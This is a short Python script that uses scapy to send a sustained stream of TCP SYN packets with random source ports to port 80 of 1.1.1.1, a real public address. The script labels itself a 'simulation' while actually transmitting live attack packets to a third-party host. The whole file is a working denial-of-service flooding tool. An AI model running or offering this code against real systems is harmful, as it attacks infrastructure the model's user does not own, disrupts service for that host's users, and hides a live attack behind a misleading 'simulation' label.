import time
import random
from scapy.all import IP, TCP, send

print("🚀 Launching Sustained SYN Flood Simulation...")
print("Press Ctrl+C in this terminal to stop the attack.")

target_ip = "1.1.1.1"

try:
    while True:
        src_port = random.randint(1024, 65535)
        pkt = IP(dst=target_ip)/TCP(sport=src_port, dport=80, flags="S")
        send(pkt, verbose=False)
        time.sleep(0.01)  # Steady stream of attack packets
except KeyboardInterrupt:
    print("\n🛑 Simulation stopped by user.")